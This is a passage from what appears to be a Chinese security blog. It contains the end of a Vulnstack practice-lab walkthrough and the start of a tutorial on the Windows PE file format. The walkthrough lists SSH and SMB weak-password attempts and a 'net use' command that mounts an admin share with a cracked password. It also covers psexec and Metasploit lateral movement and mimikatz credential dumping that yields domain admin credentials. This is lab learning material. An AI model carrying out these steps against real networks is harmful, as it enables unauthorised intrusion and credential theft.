http://192.168.93.120     code:200 len:16020  title:Home已完成 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先整理一下，93段有哪些机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2192.168.93.20 win2008192.168.93.30 win7192.168.93.100 centos 我们所在的位置192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan扫出一个 mysql 弱口令 <code>root:123</code>，是120那台机子</p><h1 id="ew搭建socks5代理"><a href="#ew搭建socks5代理" class="headerlink" title="ew搭建socks5代理"></a>ew搭建socks5代理</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p><p>再利用proxfiler实现全局代理<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p><h1 id="120备份服务器"><a href="#120备份服务器" class="headerlink" title="120备份服务器"></a>120备份服务器</h1><p>navicat连接上数据库<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>数据库完全一样，这有可能是个备份服务器<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p><p>尝试用centos的密码ssh上去，被拒绝，照着原来的写马就行，这里就不再重复了</p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="尝试永恒之蓝"><a href="#尝试永恒之蓝" class="headerlink" title="尝试永恒之蓝"></a>尝试永恒之蓝</h2><p>这三个windows机器都开了445，给msf加一段session路由，扫这三个windows机器<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>啥都没有</p><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul><li><p>10机器 - Windows Server 2012 R2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped88/tcp    open  tcpwrapped110/tcp   open  tcpwrapped135/tcp   open  tcpwrapped139/tcp   open  tcpwrapped389/tcp   open  tcpwrapped445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped464/tcp   open  tcpwrapped593/tcp   open  tcpwrapped636/tcp   open  tcpwrapped3268/tcp  open  tcpwrapped3269/tcp  open  tcpwrapped49155/tcp open  tcpwrapped49157/tcp open  tcpwrapped49158/tcp open  tcpwrapped49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>20机器 - win2008</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found110/tcp   open  tcpwrapped135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2019-12-15T05:29:23| Not valid after:  2049-12-15T05:29:23| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.| ms-sql-ntlm-info:|   192.168.93.20\MSSQLSERVER:|     Target_Name: TEST|     NetBIOS_Domain_Name: TEST|     NetBIOS_Computer_Name: WIN2008|     DNS_Domain_Name: test.org|     DNS_Computer_Name: win2008.test.org|     DNS_Tree_Name: test.org|_    Product_Version: 6.0.6003| ms-sql-info:|   192.168.93.20\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2008 RTM|       number: 10.00.1600.00|       Product: Microsoft SQL Server 2008|       Service pack level: RTM|       Post-SP patches applied: false|     TCP port: 1433|_    Clustered: false2383/tcp  open  ms-olap4?49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>30机器 - win7</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE25/tcp    open  smtp110/tcp   open  pop3135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>存在域 test.org</p><p>这里我还试着看看smb有没有匿名登录，不过都不行</p><h2 id="smb弱口令爆破"><a href="#smb弱口令爆破" class="headerlink" title="smb弱口令爆破"></a>smb弱口令爆破</h2><p>看wp说是win7和win2008的SMB是弱口令<code>administrator:123qwe!ASD</code></p><p>我就懒得爆了，直接用</p><h2 id="psexec-拿下win7、win2008"><a href="#psexec-拿下win7、win2008" class="headerlink" title="psexec 拿下win7、win2008"></a>psexec 拿下win7、win2008</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挂载C盘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p><p>利用pstools远程连接到win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p><p>利用pstools远程连接到win2008，但是使用pstools是失败的，不知道为啥，使用msf成功了<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p><p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p><h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><p>win7：直接上传mimikatz，没抓到域用户<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p><p>win2008：meterpreter自带kiwi模块，导入后抓取密码，得到域控<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p><h2 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Portable Executable Format 可移植可执行格式</title>
      <link href="/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><strong>Portable Executable (PE)</strong> 是 Windows 系统上可执行文件的文件格式。PE 文件扩展名的几个示例包括 <code>.exe</code>、<code>.dll</code>、<code>.sys</code> 和 <code>.scr</code>。本模块讨论 PE 文件的结构，这对于构建或逆向工程恶意软件非常重要。</p><p>请注意，本模块及未来的模块将经常互换使用“可执行文件”（例如 EXE、DLL）和“镜像”（Images）来指代这些文件。</p><h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><p>下图展示了一个简化的 <strong>Portable Executable (PE)</strong> 结构。图中显示的每个头部都被定义为一个数据结构，该结构包含关于 PE 文件的信息。本模块将详细解释每个数据结构。<br><img src="/Rxi134_FILE/4671b85da7b3108123c5f23d8748a504_MD5.jpeg"></p><p><img src="/Rxi134_FILE/07427b54f2cd6658fb90b65947539444_MD5.jpeg"></p><h2 id="DOS-头-IMAGE-DOS-HEADER-）"><a href="#DOS-头-IMAGE-DOS-HEADER-）" class="headerlink" title="DOS 头 (IMAGE_DOS_HEADER)）"></a>DOS 头 (IMAGE_DOS_HEADER)）</h2><p>PE 文件的第一个头部总是以两个字节开头，分别是 <code>0x4D</code> 和 <code>0x5A</code>，通常称为 **<code>MZ</code>**。这两个字节代表 DOS 头部的签名，用于确认正在解析或检查的文件是一个有效的 PE 文件。<br><img src="/Rxi134_FILE/bdd280e07e2ab3e4ea79f3a64f88be18_MD5.jpeg"></p><p><strong>DOS 头部</strong> 是一个数据结构，其定义如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE header</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// Magic number</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// Bytes on last page of file</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// Pages in file</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// Relocations</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// Size of header in paragraphs</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// Minimum extra paragraphs needed</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// Maximum extra paragraphs needed</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) SS value</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// Initial SP value</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// Checksum</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// Initial IP value</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) CS value</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// File address of relocation table</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// Overlay number</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// Reserved words</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM identifier (for e_oeminfo)</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM information; e_oemid specific</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// Reserved words</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// Offset to the NT header</span>  <span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体中最重要的成员是 <strong><code>e_magic</code></strong> 和 **<code>e_lfanew</code>**。</p><ul><li><strong><code>e_magic</code></strong> 是一个 2 字节的值，固定值为 <code>0x5A4D</code> 或 <strong>MZ</strong>。</li><li><strong><code>e_lfanew</code></strong> 是一个 4 字节的值，保存 NT 头部的起始偏移量。注意，**<code>e_lfanew</code>** 总是位于偏移量 <code>0x3C</code> 处。</li></ul><h2 id="DOS-存根"><a href="#DOS-存根" class="headerlink" title="DOS 存根"></a>DOS 存根</h2><p>在进入 NT 头部结构之前，有一个 <strong>DOS stub</strong>，这是一个错误消息，打印内容为 “<code>This program cannot be run in DOS mode</code>“（该程序无法在 DOS 模式下运行），当程序在 DOS 模式或 “磁盘操作模式” 下加载时会显示此消息。<br><img src="/Rxi134_FILE/9ee4b3e681f049fd506307b7241a8f30_MD5.jpeg"></p><p>值得注意的是，这个错误消息可以由程序员在编译时更改。虽然这不是 PE 头部的一部分，但了解它是有益的。</p><h2 id="NT-头-IMAGE-NT-HEADERS"><a href="#NT-头-IMAGE-NT-HEADERS" class="headerlink" title="NT 头 (IMAGE_NT_HEADERS)"></a>NT 头 (IMAGE_NT_HEADERS)</h2><p>NT 头部非常重要，因为它包含了另外两个镜像头部：<strong>FileHeader</strong> 和 <strong>OptionalHeader</strong>，这两个头部包含了关于 PE 文件的大量信息。</p><p>与 DOS 头部类似，NT 头部也包含一个用于验证的签名成员。通常，签名元素等于字符串 “PE”，其由 <code>0x50</code> 和 <code>0x45</code> 字节表示。但由于签名是 <code>DWORD</code> 数据类型，签名会表示为 <code>0x50450000</code>，虽然被填充了两个空字节，仍然表示为 “PE”。<br><img src="/Rxi134_FILE/944b333c6cedabdb55da4a43db439843_MD5.jpeg"></p><p>NT 头部可以通过 DOS 头部中的成员 <strong><code>e_lfanew</code></strong> 来访问，如图，0xf0 正是 NT头 的偏移<br><img src="/Rxi134_FILE/33058c354ba66ad27a5820d995f0e148_MD5.jpeg"></p><p>NT 头部的结构会根据机器的架构而有所不同。</p><ul><li>32 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>  DWORD                   Signature<span class="token punctuation">;</span>  IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>  IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>64 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS64</span> <span class="token punctuation">&#123;</span>    DWORD                   Signature<span class="token punctuation">;</span>    IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>    IMAGE_OPTIONAL_HEADER64 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>唯一的区别在于数据结构 <strong><code>OptionalHeader</code></strong> ，是 <strong><code>IMAGE_OPTIONAL_HEADER32</code></strong> 或 **<code>IMAGE_OPTIONAL_HEADER64</code>**，分别用于 32 位和 64 位架构。</p><h3 id="文件头-IMAGE-FILE-HEADER"><a href="#文件头-IMAGE-FILE-HEADER" class="headerlink" title="文件头 (IMAGE_FILE_HEADER)"></a>文件头 (IMAGE_FILE_HEADER)</h3><p>接下来是可以从之前的 NT 头部数据结构访问的头部：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>  WORD  Machine<span class="token punctuation">;</span>  WORD  NumberOfSections<span class="token punctuation">;</span>  DWORD TimeDateStamp<span class="token punctuation">;</span>  DWORD PointerToSymbolTable<span class="token punctuation">;</span>  DWORD NumberOfSymbols<span class="token punctuation">;</span>  WORD  SizeOfOptionalHeader<span class="token punctuation">;</span>  WORD  Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最重要的结构体成员是：</p><ul><li><strong><code>NumberOfSections</code></strong> - PE 文件中的段数量（稍后讨论）。</li><li><strong><code>Characteristics</code></strong> - 指定可执行文件某些属性的标志，比如它是否是动态链接库（DLL）或控制台应用程序。</li><li><strong><code>SizeOfOptionalHeader</code></strong> - 后续可选头部的大小。<br>关于文件头部的更多信息可以在官方文档页面中找到。<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">official documentation page</a>.</li></ul><h3 id="可选头部-IMAGE-OPTIONAL-HEADER"><a href="#可选头部-IMAGE-OPTIONAL-HEADER" class="headerlink" title="可选头部 (IMAGE_OPTIONAL_HEADER)"></a>可选头部 (IMAGE_OPTIONAL_HEADER)</h3><p>可选头部非常重要，尽管它被称为 “可选” ，但对 PE 文件的执行至关重要。之所以称它为“可选”，是因为某些文件类型没有这个头部。</p><p>可选头部有两个版本，分别用于 32 位和 64 位系统。两个版本的数据结构几乎相同，主要区别在于某些成员的大小。**<code>ULONGLONG</code>** 用于 64 位版本，**<code>DWORD</code>** 用于 32 位版本。此外，32 位版本中有一些在 64 位版本中不存在的成员。</p><ul><li><p>32 位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  DWORD                BaseOfData<span class="token punctuation">;</span>  DWORD                ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  DWORD                SizeOfStackReserve<span class="token punctuation">;</span>  DWORD                SizeOfStackCommit<span class="token punctuation">;</span>  DWORD                SizeOfHeapReserve<span class="token punctuation">;</span>  DWORD                SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>64位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER64</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  ULONGLONG            ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackCommit<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>可选头部包含了大量有用的信息。以下是一些常用的结构体成员：</p><ul><li><strong><code>Magic</code></strong> - 描述镜像文件的状态（32 位或 64 位镜像）。</li><li><strong><code>MajorOperatingSystemVersion</code></strong> - 所需操作系统的主要版本号（例如 11, 10）。</li><li><strong><code>MinorOperatingSystemVersion</code></strong> - 所需操作系统的次要版本号（例如 1511, 1507, 1607）。</li><li><strong><code>SizeOfCode</code></strong> - 代码段的大小（稍后讨论）。</li><li><strong><code>AddressOfEntryPoint</code></strong> - 文件的入口点偏移量（通常为 <code>main</code> 函数的偏移）。</li><li><strong><code>BaseOfCode</code></strong> - 代码段起始位置的偏移量。</li><li><strong><code>SizeOfImage</code></strong> - 镜像文件的大小，以字节为单位。</li><li><strong><code>ImageBase</code></strong> - 指定应用程序在执行时要加载到内存中的首选地址。然而，由于 Windows 的内存保护机制（例如地址空间布局随机化，ASLR），很少见到镜像映射到其首选地址，因为 Windows PE 加载器会将文件映射到不同的地址。Windows PE 加载器进行的这种随机分配会在实现未来技术时导致问题，因为某些被认为是常量的地址发生了变化。之后，Windows PE 加载器会通过 PE 重定位来修复这些地址。</li><li><strong><code>DataDirectory</code></strong> - 可选头部中最重要的成员之一。它是一个 <strong><code>IMAGE_DATA_DIRECTORY</code></strong> 的数组，包含 PE 文件中的目录（稍后讨论）。</li></ul><h4 id="数据目录-Data-Directory"><a href="#数据目录-Data-Directory" class="headerlink" title="数据目录 Data Directory"></a>数据目录 Data Directory</h4><p>可以通过可选头的最后一个成员来访问数据目录（Data Directory）。该成员是一个 <code>IMAGE_DATA_DIRECTORY</code> 数据类型的数组，其数据结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span>    DWORD   VirtualAddress<span class="token punctuation">;</span>  <span class="token comment">// 虚拟地址</span>    DWORD   Size<span class="token punctuation">;</span>            <span class="token comment">// 大小</span><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>数据目录数组的大小由常量 <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> 决定，其值为 16。数组中的每个元素表示一个特定的数据目录，包含了某个 PE 节（section）或数据表（Data Table）的一些数据（即存储 PE 具体信息的地方）。</p><p>可以通过数组的索引来访问特定的数据目录：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXPORT</span>          <span class="token expression"><span class="token number">0</span>   </span><span class="token comment">// Export Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IMPORT</span>          <span class="token expression"><span class="token number">1</span>   </span><span class="token comment">// Import Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_RESOURCE</span>        <span class="token expression"><span class="token number">2</span>   </span><span class="token comment">// Resource Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXCEPTION</span>       <span class="token expression"><span class="token number">3</span>   </span><span class="token comment">// Exception Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_SECURITY</span>        <span class="token expression"><span class="token number">4</span>   </span><span class="token comment">// Security Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BASERELOC</span>       <span class="token expression"><span class="token number">5</span>   </span><span class="token comment">// Base Relocation Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DEBUG</span>           <span class="token expression"><span class="token number">6</span>   </span><span class="token comment">// Debug Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token 